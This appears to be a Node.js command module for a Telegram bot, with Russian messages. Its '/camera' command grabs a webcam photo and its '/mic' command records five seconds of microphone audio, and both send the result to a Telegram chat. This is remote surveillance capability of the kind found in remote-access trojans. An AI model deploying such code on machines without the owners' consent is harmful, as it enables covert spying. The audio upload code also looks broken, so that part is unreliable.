const { sh, fs } = require("../tools/helpers.js");
const screenshot = require("../tools/screenshot.js");

module.exports = {
  commands: {
    "/camera": {
      handler: async (chatId) => {
        const path = `/tmp/webcam_${Date.now()}.jpg`;
        const out = await sh(`ffmpeg -f v4l2 -i /dev/video0 -vframes 1 "${path}" -y 2>&1 || echo 'Ошибка ffmpeg'`);
        if (out.includes("Ошибка") || !fs.existsSync(path)) {
          const alt = await sh(`fswebcam -r 640x480 "${path}" 2>&1 || echo 'Ошибка fswebcam'`);
          if (alt.includes("Ошибка") || !fs.existsSync(path)) return "❌ Веб-камера не найдена";
        }
        const size = fs.statSync(path).size;
        const tg = require("../telegram.js");
        await tg.sendPhoto(chatId, path, `📷 Фото с веб-камеры (${Math.round(size / 1024)}KB)`);
        try { fs.unlinkSync(path); } catch {}
        return null;
      },
      description: "Снимок с веб-камеры",
    },

    "/mic": {
      handler: async (chatId) => {
        const path = `/tmp/mic_${Date.now()}.wav`;
        const out = await sh(`arecord -d 5 -f cd "${path}" 2>&1 || echo 'Ошибка arecord'`);
        if (out.includes("Ошибка") || !fs.existsSync(path)) {
          return "❌ Микрофон не найден или не доступен";
        }
        const size = fs.statSync(path).size;
        const tg = require("../telegram.js");
        const r = await fetch(`${tg.TG}/sendAudio`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, audio: path, title: "Запись с микрофона" }),
        });
        try { fs.unlinkSync(path); } catch {}
        return (await r.json()).ok ? null : "❌ Не удалось отправить аудио";
      },
      description: "Запись звука с микрофона (5 сек)",
    },
  },
};
